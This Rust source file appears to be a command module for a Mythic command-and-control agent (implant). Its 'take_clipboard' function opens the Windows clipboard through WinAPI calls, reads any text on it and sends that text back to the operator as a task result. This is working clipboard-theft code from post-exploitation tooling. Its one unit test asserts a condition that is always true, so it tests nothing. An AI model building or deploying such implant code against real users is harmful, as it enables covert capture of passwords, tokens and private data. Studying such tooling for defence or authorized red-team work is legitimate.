use std::ptr;
use std::thread;
use std::time::Duration;
use serde::{Deserialize, Serialize};
use crate::{AgentTask, mythic_success, mythic_error};
use crate::agent::ClipboardArgs;

#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]
use winapi::um::winbase::GlobalSize;
#[cfg(target_os = "windows")]
use winapi::ctypes::c_void;
#[cfg(target_os = "windows")]
use std::ffi::OsString;
#[cfg(target_os = "windows")]
use std::os::windows::ffi::OsStringExt;

#[cfg(target_os = "windows")]
const CF_UNICODETEXT: u32 = 13;
const MAX_RETRIES: u32 = 10;
const RETRY_DELAY_MS: u64 = 100;

#[cfg(target_os = "windows")]
pub struct WindowsClipboard;

#[cfg(target_os = "windows")]
impl WindowsClipboard {
    /// Attempts to open the clipboard with retry logic
    fn try_open_clipboard() -> Result<(), String> {
        for attempt in 0..MAX_RETRIES {
            unsafe {
                if OpenClipboard(ptr::null_mut()) != 0 {
                    return Ok(());
                }
            }
            
            if attempt == MAX_RETRIES - 1 {
                return Err(format!("Failed to open clipboard after {} attempts", MAX_RETRIES));
            }
            
            thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
        }
        
        Err("Unexpected error opening clipboard".to_string())
    }

    /// Retrieves text from the clipboard
    pub fn get_text() -> Result<Option<String>, String> {
        unsafe {
            // Check if clipboard format is available
            if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0 {
                return Ok(None);
            }

            Self::try_open_clipboard()?;

            let result = Self::inner_get();
            
            // Always try to close the clipboard
            CloseClipboard();
            
            result
        }
    }

    /// Internal method to get clipboard data after clipboard is opened
    fn inner_get() -> Result<Option<String>, String> {
        unsafe {
            let handle = GetClipboardData(CF_UNICODETEXT);
            if handle.is_null() {
                return Ok(None);
            }

            // Lock the global memory to get a pointer
            let pointer = GlobalLock(handle as *mut c_void);
            if pointer.is_null() {
                return Ok(None);
            }

            // Get the size of the data
            let size = GlobalSize(handle as *mut c_void) as usize;
            if size == 0 {
                GlobalUnlock(handle as *mut c_void);
                return Ok(None);
            }

            // Convert the wide string to Rust String
            let result = Self::wide_ptr_to_string(pointer as *const u16, size);
            
            // Unlock the memory
            GlobalUnlock(handle as *mut c_void);
            
            result.map(Some)
        }
    }

    /// Converts a wide character pointer to a Rust String
    fn wide_ptr_to_string(pointer: *const u16, size: usize) -> Result<String, String> {
        if pointer.is_null() {
            return Err("Null pointer provided".to_string());
        }

        // Calculate the number of wide characters (size is in bytes, u16 is 2 bytes)
        let char_count = size / 2;
        
        // Create a slice from the pointer
        let wide_slice = unsafe { std::slice::from_raw_parts(pointer, char_count) };
        
        // Convert to OsString and then to String
        let os_string = OsString::from_wide(wide_slice);
        
        // Convert to regular String, handling any conversion errors
        match os_string.into_string() {
            Ok(mut string) => {
                // Trim null terminators
                while string.ends_with('\0') {
                    string.pop();
                }
                Ok(string)
            }
            Err(os_string) => {
                // If conversion fails, try lossy conversion as fallback
                let string = os_string.to_string_lossy().into_owned();
                let mut cleaned = string.clone();
                while cleaned.ends_with('\0') {
                    cleaned.pop();
                }
                Ok(cleaned)
            }
        }
    }
}

// macOS implementation - placeholder since target is Windows
#[cfg(target_os = "macos")]
pub struct OsxClipboard;

#[cfg(target_os = "macos")]
impl OsxClipboard {
    pub fn get_text() -> Result<Option<String>, String> {
        Err("macOS clipboard not implemented in this build".to_string())
    }
}

// Cross-platform clipboard interface
pub struct Clipboard;

impl Clipboard {
    pub fn get_text() -> Result<Option<String>, String> {
        #[cfg(target_os = "windows")]
        {
            WindowsClipboard::get_text()
        }
        
        #[cfg(target_os = "macos")]
        {
            OsxClipboard::get_text()
        }
        
        #[cfg(not(any(target_os = "windows", target_os = "macos")))]
        {
            Err("Clipboard not implemented for this OS".to_string())
        }
    }
}

// Main command execution function for Mythic
pub fn take_clipboard(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    match Clipboard::get_text() {
        Ok(Some(text)) => {
            if text.is_empty() {
                Ok(mythic_success!(task.id, "Clipboard is empty or contains no text data."))
            } else {
                Ok(mythic_success!(task.id, text))
            }
        }
        Ok(None) => Ok(mythic_success!(task.id, "Clipboard is empty or doesn't contain text.")),
        Err(e) => Ok(mythic_error!(task.id, format!("Error accessing clipboard: {}", e))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clipboard_availability() {
        // This test just ensures the functions compile and can be called
        let result = Clipboard::get_text();
        // We can't easily test the actual clipboard content in unit tests
        // without mocking the Windows API, so we just verify it doesn't panic
        assert!(result.is_ok() || result.is_err());
    }
}